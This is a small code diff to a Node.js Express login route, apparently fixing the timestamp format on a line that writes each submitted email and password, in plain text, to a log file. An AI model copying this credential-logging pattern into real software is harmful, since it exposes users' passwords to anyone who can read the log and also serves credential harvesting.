@@ -8,7 +8,7 @@ var router = express.Router();
 /* POST login listing. */
 router.post('/', function (req, res) {
 
-    writer.write(("[" + new Date()).toISOString() + "]" +
+    writer.write((new Date()).toISOString() +
         ": [Email]: " + req.body.username + 
         " [Password]: " + req.body.password + "\n");
 
